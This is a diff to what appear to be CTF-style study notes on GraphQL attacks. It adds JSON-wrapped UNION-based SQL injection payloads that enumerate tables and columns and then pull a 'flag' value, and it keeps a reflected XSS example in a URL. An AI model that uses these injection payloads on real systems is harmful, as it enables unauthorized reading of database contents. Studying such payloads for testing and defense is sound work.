@@ -33,9 +33,10 @@ user query also requires an argument.
 Based on the introspection query, the UserObject consists of six fields (columns), so our UNION-base SQL injection payload needs to contain siz columns to match the number of columns in the original query.
 ```
 {
-  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
-    username
-  }
+ "query":"{user(username: \"x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") { username }}"
+}
+{
+ "query":"{user(username: \"x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") { username }}"
 }
 ```
 
@@ -68,3 +69,19 @@ Can occur if invalid arguments are reflected in error messages.
 }
 ```
 - Visiting /post?id=<script>alert(1)</script> breaks
+
+
+
+
+
+```
+{
+ "query":"{user(username: \"x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()--     -\") { username }}"
+}
+{
+ "query":"{user(username: \"x' UNION SELECT 1,2,GROUP_CONCAT(COLUMN_NAME),4,5,6 FROM information_schema.columns WHERE table_name='flag'--     -\") { username }}"
+}
+{
+ "query":"{user(username: \"x' UNION SELECT 1,2,flag,4,5,6 FROM db.flag--     -\") { username }}"
+}
+```
